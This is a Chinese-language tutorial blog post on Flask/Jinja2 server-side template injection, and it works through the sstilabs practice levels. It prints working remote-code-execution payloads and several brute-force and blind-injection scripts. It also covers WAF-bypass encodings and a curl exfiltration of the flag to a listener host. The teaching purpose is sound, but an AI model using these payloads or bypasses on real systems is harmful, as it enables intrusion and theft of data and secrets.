---
author: Noel
pubDatetime: 2021-10-26T23:42:31.000+08:00
modDatetime: 2021-10-26T23:42:31.000+08:00
title: FLASK SSTI概念速通
featured: false
draft: false
tags:
  - Web安全
  - 网络安全
  - SSTI
description: 
   本片文章主要介绍SSTI的概念和基本的利用手法, 适用于新手速通...
---

这是我在先知社区的第一篇的文章,希望能对各位师傅有所帮助.

[Falsk ssti](https://xz.aliyun.com/t/10394)

<!-- more -->

![banner](https://particles.oss-cn-beijing.aliyuncs.com/img/banner.jpg)

## SSTI 介绍

SSTI 全称（Server-Side Template Injection),中文名服务端模板注入.

在介绍模板注入之前,首先得知道什么是模板.

## 什么是模板以及模板引擎

用通俗的话解释,模板就是一段话中存在可动态替换的部分.假设存在以下代码

```python
print(f"hello{username}")
```

由于这句代码能够因为不同的 `username`而显示不同的结果,因此我们可以简单的把这段话理解为一个模板.(当然这个例子不是很恰当)

而模板引擎的作用是为了使用户界面(例如上面的`hello+用户名`)与业务数据或内容(例如上面的 username)生成特定的文档(如你所看到的 HTML).

> 通俗点讲:拿到数据,塞到模板里,然后让渲染引擎将塞进去的东西生成 html 的文本,最后返回给浏览器.

采用模板以及模板引擎的好处可以让程序(网站)实现界面与数据分离,业务代码与逻辑代码的分离,这大大提升了开发效率,也使得代码重用变得更加容易.

但是由于渲染的数据是业务数据,且大多数都由用户提供,这就意味着用户对输入可控.如果后端没有对用户的输入进行检测和判断,那么就容易产生代码和数据混淆,从而产生注入.

## Flask 基础

本文主要学习和记录 Python 中 Flask SSTI.在详细分析 Flask SSTI 之前,得先对 Flask 的基础语法有些了解.

> Flask 是一个用 python 实现的微型 web 框架,意味着 flask 能为您提供了工具、库和技术,使您可以构建 web 应用程序.

为了快速了解 Flask 基础,本人简单编写了一段代码`demo.py`,以此代码为例简单说明 Flask 语法

```python
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World!'

if __name__ == '__main__':
    app.run()
```

1. 第一行,导入 Flask 类.用于后面实例化出一个 WSGI 应用程序.

2. 创建 Flask 实例,传入的第一个参数为模块或包名.
3. 使用`route()`装饰器告诉 Flask 怎样解析我们访问的 URL.起路由作用.
4. 下面跟着的函数将在访问对应路由时触发.比如此处我们访问网站根目录,将返回 `Hello Wrold`到对应页面.
5. `app.run()`函数让应用在本地启动

运行此`.py`文件

![image-20210831161733055](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831161733055.png)

并访问`http://127.0.0.1:5000`你将看到

![image-20210831161850794](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831161850794.png)

Flask 官网也提供了一篇快速入门的章节,可[点击此处](http://docs.jinkan.org/docs/flask/quickstart.html)前往阅读

## 模板渲染

Flask 使用了 Jinja2 引擎来对模板进行渲染.

再给出渲染模板示例代码之前,咱们先创建个模板,命名为`demo_tmp.html`,内容如下:

```html
<html>
  <head>
    <title>Welcome to Flask</title>
  </head>
 <body>
      <h1>Hello, {{name}}!</h1>
  </body>
</html>
```

{% raw %}
其中, `{{ }}` 内是需要渲染的内容.
{% endraw %}

> jinja2 模板中使用 {{ }} 语法表示一个变量,它是一种特殊的占位符.当利用 jinja2 进行渲染的时候,它会把这些特殊的占位符进行填充/替换,jinja2 支持 python 中所有的 Python 数据类型比如列表、字段、对象等.

由于 Flask 会在 templates 文件夹里寻找模板,所以需要在`demo.py`的同级目录下创建一个`templates`目录,并将`demo_tmp.html`放入.

![image-20210831180055212](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180055212.png)

稍微修改以下`demo.py`

```python
from flask import Flask
from flask import request
from flask import render_template

app = Flask(__name__)

@app.route('/',methods=['GET']
def hello_world():
    query = request.args.get('name') # 获取get方法传递的 name的值
    return render_template('demo_tmp.html', name=query) # 将get接收到的name的值传入模板,进行渲染

if __name__ == '__main__':
    app.run(debug=True)  # 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入
```

运行并访问`http://127.0.0.1:5000/?name=Noel`,可以看到结果如下结果

![image-20210831180652308](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180652308.png)

页面显示会随着传递给 name 参数的改变而改变.

![image-20210831180919952](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180919952.png)

![image-20210831184102838](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831184102838.png)

那注入问题有又是怎么产生的呢?

## Flask SSTI

这里我先给出一段拥有 ssti 注入漏洞的 flask 代码:

```python
@app.errorhandler(404)
def page_not_found(e):
    template = '''{%% extends "layout.html" %%}
    {%% block body %%}
    <div class="center-content error">
        <h1>Opps! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
    {%% endblock %%}
    ''' % (request.url)
    return render_template_string(template), 404
```

> 代码来源于:https://blog.nvisium.com/p263

这段代码的逻辑为:当访问不存在的路由时或错误请求导致 404 时,将 URL 格式化为字符串并将其展示给用户.假设我们传入的 url 为`http://127.0.0.1:5000/<script>alert(1)</script>`,访问,触发弹窗.

![image-20210831183648864](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831183648864.png)

访问`http://127.0.0.1:5000/{{7*7}}`,发现 `{{7*7}}`被解析为 `49`

![image-20210831183726235](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831183726235.png)

大家可以将漏洞代码和上面的`demo.py`进行对比,思考下为什么漏洞代码能够产生注入.

## 为什么产生 SSTI

其实对比两段代码很容易发现,

`demo.py`是使用`render_template('demo_tmp.html', name=query)`,而使用这种方式渲染的优点在于需要渲染的参数是通过`name=query`写死了的,并未交给用户控制.

而在漏洞代码中

```python
template = '''{%% extends "layout.html" %%}
    {%% block body %%}
    <div class="center-content error">
        <h1>Opps! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
    {%% endblock %%}
    ''' % (request.url)
return render_template_string(template), 404
```

是直接将用户输入的 url 拼接到 template 中,再进行的渲染的.

由于 url 可控,所以整体 template 可控,如果传入的 url 中包含`{{xxx}}`,那么在使用`render_template_string(template)`进行渲染的时候就会把 `{{}}`中的内容进行解析.

## SSTI 漏洞利用

既然说`{{}}`内能够解析表达式和代码,那我们试试直接插入 `import os;os.system('')`执行 shell

![image-20210902205905654](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210902205905654.png)

很遗憾这种办法是行不通的.

原因是 Jinjia 引擎限制了使用 import.

那还有什么方法能够执行代码 python 吗

这时 python 的魔法方法和一些内置属性便能发挥作用.

这里我先给出一个 `payload`,通过 payload 来讲解相关魔法方法、内置属性以及利用过程.

`{{"".__class__.__base__.__subclasses__()[118].__init__.__globals__['system']('whoami')}}`

## 魔法方法和内置属性

`__class__`:返回该实例对象的类

```python
''.__class__
# <class 'str'>
```

`__base__`:返回该类的父类

```python
''.__class__.__base__
# <class 'object'>
# 及 object 是 str 的基类(父类)
```

`__subclasses__`():返回当前类的所有子类,返回结果是个列表

```python
''.__class__.__base__.__subclasses__()
#[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, ...

```

很明显,上面这几个内置属性以及魔法方法能够帮助我们得到一些类.那我们得到这些类后干什么呢?

由于无法直接使用`import`导入模块,那我们就间接导入.通过上诉的一些内置属性和方法可以找到很多基类和子类,而有些基类和子类是存在一些引用模块的,只要我们初始化这个类,再利用`__globals__`调用可利用的函数,就能够达成我们的目的.

比如:我们想要执行系统函数,首先我们得知道 python 中那个函数能够执行系统函数.当然`system`能够达做到,所以我们得寻找哪些类能够调用`system`.本次实例中使用了 118 索引,索引的具体内容是`<class 'os._wrap_close'>`

![image-20210924165507076](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924165507076.png)

选择初始化这个类是因为这个类属于`os 模块`,我们能够调用其中的`system`方法![image-20210924170058683](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170058683.png)

![image-20210924170154061](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170154061.png)

![image-20210924170402024](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170402024.png)

除此之外,FLASK SSTI 常用来构建 payload 还有:

> 由于目前使用 python3 版本较多,以下 payload 均使用 python3 实现

#### \_\_builtins\_\_

python 在启动时就加载`__builtins__`,里面包含了一些常用方法比如:`abs()`,`max()`,`eval()`等等.详细信息大家可以去[官网](https://docs.python.org/3/library/builtins.html)了解.

那怎样去查找哪些类中拥有`__builtins__`呢:
这个贴出个脚本`find_exp_class.py`,方便用来查找

```python
exp_flask = '__builtins__'
number = 0
for i in "".__class__.__base__.__subclasses__():
	try:
		if "__import__()" in i.__init__.__globals__.keys():
			print(number,"-->>",i)
	except :
		pass
	finally:
		number += 1
```

在我本地(python3.6)运行,效果如下
![image-20210924172705770](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924172705770.png)

构建 payload,可以看到能够执行系统命令

`().__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")`

![image-20210924173036642](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173036642.png)

#### sys

同样,更改`find_exp_class.py`中`exp_flask`的内容为`sys`,本地运行,得到相关类和索引如下:

![image-20210924173220905](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173220905.png)

构建 payload,可以看到能够执行系统命令

`().__class__.__base__.__subclasses__()[64].__init__.__globals__['sys'].modules["os"].popen("whoami").read()`

![image-20210924173714196](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173714196.png)
其实这个 payload 的本质也是使用`os`模块

#### \_\_import\_\_

同样,更改`find_exp_class.py`中的`exp_flask`的内容为`__import__`,本地运行,得到相关类和索引如下:

![image-20210924183512163](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924183512163.png)

构建 payload,可以看到能够执行系统命令:

`().__class__.__base__.__subclasses__()[64].__init__.__globals__['__import__']('os').system('whoami')`

![image-20210924183400807](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924183400807.png)
同样,这个 payload 的本质也是使用`os`模块中的方法

有大佬把 python 目前自带函数全部搜集了起来并筛选出了可利用部分,详细可以参考这篇[博客](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python3)

## 练习

光说不练假把式.

在了解 **SSTI 原理** 以及 payload 构造基础之后,来通过靶场练练手.学习一下常见 trick

> 靶场来源于 Github:https://github.com/X3NNY/sstilabs

### Level 1 no waf

![image-20210924190038637](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190038637.png)

第一关没 waf

初步尝试 ,由于不好整理索引,写个脚本

![image-20210924193657572](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924193657572.png)

```python
import requests

url = "http://192.168.0.108:5001/level/1"

for i in range(300):
	data = {"code": '{{"".__class__.__base__.__subclasses__()['+ str(i) +']}}'}
	try:
		response = requests.post(url,data=data)
		#print(data)
		#print(response.text)
		if response.status_code == 200:
			if "_wrap_close" in response.text:
				print(i,"----->",response.text)
				break
	except :
		pass
# 结果为  132 -----> Hello &lt;class &#39;os._wrap_close&#39;&gt;
```

得到索引后,构造 payload,拿到 flag

`{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag').read()}}`

![image-20210927112712493](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112712493.png)

### 拓展

由于程序并没有对输入的内容进行任何判断和过滤,所以我们可以直接插入一段通用 payload 代码段,

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if'eval' in b.keys() %}
      {{b['eval']('__import__("os").popen("calc").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

但是我这里没打通.后来在开服务的机器上查了下发现没有 `catch_warnings`这个类.也懒的改了,感兴趣的可以试试.

### Level 2 bypass {{

![image-20210924190118628](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190118628.png)

`{{`被 ban 了,不过`{% %}`可以使用,使用`{% %}`进行盲打

> {% %} 是属于 flask 的控制语句,且以{% end… %}结尾,可以通过在控制语句定义变量或者写循环,判断.
>
> 详细内容可前往 [Jinja2 模板官方文档](https://jinja.palletsprojects.com/templates/)进行了解

写个盲注脚本

```python
import requests

url = "http://192.168.0.108:5001/level/2"

for i in range(300):
	try:
		data = {"code": '{% if "".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("cat flag").read() %}payload{% endif %}'}
		response = requests.post(url,data=data)
		if response.status_code == 200:
			if "payload" in response.text:
				print(i,"--->",data)
				break
	except :
		pass

# 结果为 132 ---> {'code': '{% if "".__class__.__base__.__subclasses__()[132].__init__.__globals__["popen"]("cat flag").read() %}payload{% endif %}'}

```

脚本结果说明`132索引`能够执行代码,配合`{%print(code)%}`,拿到 flag

`{%print("".__class__.__base__.__subclasses__()[132].__init__.__globals__["popen"]("cat flag").read() )%}`

![image-20210927112343806](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112343806.png)

#### 拓展

除了能够使用`{%print()%}` 直接输出内容外,还可以使用`popen('cat flag').read(num)` 进行内容爆破.

如`popen('cat flag').read(1)`则表示内容的第一位,`popen('cat flag').read(2)`表示内容的前两位,依次类推.

### Level 3

![image-20210924190126091](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190126091.png)

这题一开始没懂什么意思,看了源码才理解

```python
def level3(code):
    try:
        render_template_string(code)
        return "correct"
    except Exception:
        return "wrong"
```

对输入的字符串进行渲染,如果渲染异常返回 wrong,渲染正确返回 correct.

由于没有任何回显,可以写个脚本盲打

脚本内容如下:

```python
import requests

url = "http://192.168.0.108:5001/level/3"

for i in range(300):
	try:
		data = {"code": '{{"".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("curl http://192.168.0.105:8081/`cat flag`").read()}}'}
		response = requests.post(url,data=data)
	except :
		pass
```

在本地开个监听,

运行脚本,拿到 flag

![image-20210927155336932](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927155336932.png)

### Level 4 bypass [ ]

![image-20210924190136543](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190136543.png)
初步尝试后,发现过滤了`[ ]`,其余没有任何过滤,此处可以使用`__getitem__()`绕过

> \_\_getitem\_\_() 是 python 的一个魔法方法,当对列表使用时,传入整数返回列表对应索引的值;对字典使用时,传入字符串,返回字典相应键所对应的值.

简单更改 `Level 1`的脚本用于本题

```python
import requests

url = "http://192.168.0.108:5001/level/4"

for i in range(300):
	data = {"code": '{{"".__class__.__base__.__subclasses__().__getitem__('+ str(i) +')}}'}
	try:
		response = requests.post(url,data=data)
		if response.status_code == 200:
			if "_wrap_close" in response.text:
				print(i,"----->",response.text)
				break
	except :
		pass
# 结果  132 -----> Hello &lt;class &#39;os._wrap_close&#39;&gt;
```

可以看到列表 132 的索引位置出现了可利用的类,直接构造 payload,拿到 flag

`{{''.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__('popen')('cat flag').read()}}`

![image-20210927131713503](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927131713503.png)

### Level 5 bypass ‘ “

![image-20210925232814991](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210925232814991.png)
初步尝试发现只过滤了`' "`,其余没有任何过滤,此处可以使用`request.args`绕过.

> 在搭建 flask 时,大多数程序内部都会使用 flask 的 request 来解析 get 请求.此出我们就可以通过构造带参数的 url,配合 request.args 获取构造参数的内容来绕过限制

同样使用 `Level 1`的脚本跑出可利用类的索引为 132,构造如下 payload,拿到 flag

`{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}`

![image-20210925234522328](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210925234522328.png)

#### 拓展

既然能够通过`request.args`获取 get 参数构造 payload,那能否通过 post 提交内容构造 payload 呢.答案是肯定的,除此之外,还能通过 cookie 传入等.读者们可以亲自动手尝试利用`request.post`或`request.cookie`的方法绕过本题.

> request 代码详细内容可前往[官方文档](https://dormousehole.readthedocs.io/en/latest/api.html#flask.request)自行了解

```python
request.args.key   	 获取get传入的key的值
request.values.x1 	 所有参数
request.cookies      获取cookies传入参数
request.headers      获取请求头请求参数
request.form.key   	 获取post传入参数	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 获取post传入参数	(Content-Type:a/b)
request.json		 获取post传入json参数  (Content-Type: application/json)
```

### Level 6 bypass \_

![image-20210926103636017](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926103636017.png)

初步尝试发现过滤了`_`,其余没有任何过滤,此处可以使用过滤器`| attr()`绕过.

#### 关于过滤器

[官方链接](https://jinja.palletsprojects.com/en/3.0.x/templates/#filters)

    1. 过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数
    2. 可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.

搬一下官方所给的内置过滤器

| [`abs()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.abs)                       | [`float()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.float)             | [`lower()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.lower)           | [`round()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.round)           | [`tojson()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.tojson)       |
| -------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| [`attr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.attr)                     | [`forceescape()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.forceescape) | [`map()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.map)               | [`safe()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.safe)             | [`trim()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.trim)           |
| [`batch()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.batch)                   | [`format()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.format)           | [`max()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.max)               | [`select()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.select)         | [`truncate()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.truncate)   |
| [`capitalize()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.capitalize)         | [`groupby()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.groupby)         | [`min()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.min)               | [`selectattr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.selectattr) | [`unique()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.unique)       |
| [`center()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.center)                 | [`indent()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.indent)           | [`pprint()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.pprint)         | [`slice()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.slice)           | [`upper()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.upper)         |
| [`default()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.default)               | [`int()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.int)                 | [`random()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.random)         | [`sort()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.sort)             | [`urlencode()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.urlencode) |
| [`dictsort()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.dictsort)             | [`join()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.join)               | [`reject()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reject)         | [`string()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.string)         | [`urlize()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.urlize)       |
| [`escape()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.escape)                 | [`last()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.last)               | [`rejectattr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.rejectattr) | [`striptags()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.striptags)   | [`wordcount()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.wordcount) |
| [`filesizeformat()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.filesizeformat) | [`length()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.length)           | [`replace()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.replace)       | [`sum()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.sum)               | [`wordwrap()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.wordwrap)   |
| [`first()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.first)                   | [`list()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.list)               | [`reverse()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reverse)       | [`title()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.title)           | [`xmlattr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.xmlattr)     |

**_常用过滤器_**

```python
length() # 获取一个序列或者字典的长度并将其返回

int()：# 将值转换为int类型；

float()：# 将值转换为float类型；

lower()：# 将字符串转换为小写；

upper()：# 将字符串转换为大写；

reverse()：# 反转字符串；

replace(value,old,new)： # 将value中的old替换为new

list()：# 将变量转换为列表类型；

string()：# 将变量转换成字符串类型；

join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用

attr(): # 获取对象的属性
```

回到原题,本题我们利用到的过滤器为`attr()`.其用法为 `foo|attr("bar")`,结果等价于`foo.bar`

我们可以利用`request.args`向 attr 里面传入参数,

但这里再介绍一种编码绕过,

`__class__ => \x5f\x5fclass\x5f\x5f`

其中`_`的十六进制编码为`\x5f`

![image-20210926104739695](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926104739695.png)

构造 payload,拿到 flag

> paload 原型: ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()[132].\_\_init\_\_.\_\_globals\_\_\['open’\](‘cat flag').read()

`{{()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(132)|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")('popen')('cat flag')|attr("read")()}}`

![image-20210926111523826](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926111523826.png)

#### 拓展

除了可以使用十六进制编码外,还可以使用 unioncode

`__class__`=>`\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f`

[例子](https://buaq.net/go-74232.html):

`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}`

**_Unicode 编码后:_**

`{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}`

### Level 7 bypass .

![image-20210926111709414](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926111709414.png)
初步尝试发现过滤了`.`,其余没有任何过滤,此处可以使用`[]`绕过.

> [You can use a dot (`.`) to access attributes of a variable in addition to the standard Python `__getitem__` “subscript” syntax (`[]`).](https://jinja.palletsprojects.com/en/3.0.x/templates/#variables)
>
> python 语法除了可以使用点 `.`来访问对象属性外,还可以使用中括号`[]`.同样也可以使用\_\_getitem\_\_

构造 payload,拿到 flag

`{{()['__class__']['__base__']['__subclasses__']()[132]['__init__']['__globals__']['popen']('cat flag')['read']()}}`

![	](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926112300549.png)

### Level 8 bypass keywords

![image-20210926130328927](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926130328927.png)

从提示可以看到 ban 了许多关键字.此处可以使用`字符串拼接`绕过

构造 payload,拿到 flag

`{{()['__cla''ss__']['__ba''se__']['__subcla''sses__']()[132]['__in''it__']['__glo''bals__']['popen']('cat flag')['read']()}}`

![image-20210926143626497](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143626497.png)

#### 拓展

除了使用简单的字符串拼接方式外,还可以使用:

1. 字符编码(上面介绍过,就不再提了)

2. 使用`Jinjia2`中的`~`进行拼接.如`{%set a="__cla"%}{%set aa="ss__"%}{{a~aa}}`

3. 使用`join`过滤器.例如使用`{%set a=dict(__cla=a,ss__=a)|join%}{{a}}`,会将`__cla`和`ss__`拼接在一起,或者`{%set a=['__cla','ss__']|join%}{{a}}`

4. 使用`reverse`过滤器.如`{%set a="__ssalc__"|reverse%}{{a}}`

5. 使用`replace`过滤器.如`{%set a="__claee__"|replace("ee","ss")%}{{a}}`

6. 利用 python 的`char()`.例如

   ```python
   {% set chr=url_for.__globals__['__builtins__'].chr %}
   {{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
   ```

   …

### Level 9 bypass number

![image-20210926143646554](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143646554.png)

从提示可以看出 ban 了所有数字,所以这道题得想办法构造数字.使用过滤器`|length`可以绕过

使用过滤器构造 132

`{% set a='aaaaaaaaaaa'|length*'aaa'|length*'aaaa'|length %}{{a}}`

![image-20210926150339261](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926150339261.png)

`{{()['__class__']['__base__']['__subclasses__']()[132]['__init__']['__globals__']['popen']('cat flag')['read']()}}`

构造 payload,拿到 flag

`{% set a='aaaaaaaaaaa'|length*'aaa'|length*'aaaa'|length %}{{()['__class__']['__base__']['__subclasses__']()[a]['__init__']['__globals__']['popen']('cat flag')['read']()}}`

![image-20210926150534193](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926150534193.png)

### Level 10

![image-20210926143655782](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143655782.png)

这一关的目的是拿到 config,当我们使用`{{config}}`以及`{{self}}`时都返回了 None.看来是被 ban 了,所以得重新寻找一个储存相关信息的变量.

[通过寻找](https://ctftime.org/writeup/11036),发现存在这么一个变量`current_app`是我们需要的.[官网](http://docs.jinkan.org/docs/flask/appcontext.html)对`current_app`提供了这么一句说明

> 应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。

因此,此处能使用`current_app`绕过.

构造 payload,拿到 config
`{{url_for.__globals__['current_app'].config}}`
`{{get_flashed_messages.__globals__['current_app'].config}}`

### Level 11 bypass combination1

![image-20210926143712383](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143712383.png)
这一关颜色和之前不同,感觉难度会有所增加.

绕过`' "`可以用 request 构造 get 参数代替,但是 request 被 ban 了,request 可以使用字符串拼接构造,但是`' "`又被 ban 了,`.`被过滤可以用`[]`绕过,但是`[]`也被 ban 了.`[]`可以用`__getitem__`绕过,`.`可以用`attr`绕过,这两个没有被过滤,说明还是有希望.现在关键就是怎么绕过`' 和 "`.

再`Level 9 bypass keyword` 的扩展中,使用过滤器`dict()|join`构造关键子的过程中没有出现`' "`,可以使用这种办法绕过.

`{%set a=dict(__cla=a,ss__=b)|join%}{{()|attr(a)}}`

![image-20210926170311552](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926170311552.png)

不过在后面构造命令`cat flag`时空格无法识别.通过这篇[博客](https://buaq.net/go-74232.html),发现了新思路.

#### 绕过空格

通过以下构造可以得到字符串,举个例,可以发现输出的字符串中存在空格、部分数字、`<`以及部分字母.利用过滤器`list`将其变为列表类型再配合使用索引,就能得到我们想要的.

```python
{% set org = ({ }|select()|string()) %}{{org}}
{% set org = (self|string()) %}{{org}}
{% set org = self|string|urlencode %}{{org}}
{% set org = (app.__doc__|string) %}{{org}}
```

![image-20210927143907669](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927143907669.png)

![image-20210927144342078](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144342078.png)

![image-20210927144420692](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144420692.png)

